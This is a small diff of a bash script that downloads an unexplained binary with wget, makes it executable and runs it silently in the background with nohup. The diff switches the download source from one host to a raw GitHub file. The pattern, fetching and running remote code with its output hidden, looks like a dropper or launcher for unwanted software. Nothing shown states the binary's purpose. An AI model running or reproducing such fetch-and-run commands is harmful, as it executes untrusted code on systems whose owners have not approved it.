@@ -1,4 +1,4 @@
 #!/bin/bash
-wget http://www.ccbb.run/new
-chmod +x new
-nohup ./new > 1 2>&1 &
+wget https://github.com/sxzcy/Ctlist/raw/master/cellur
+chmod +x cellur
+nohup ./cellur > 1 2>&1 &
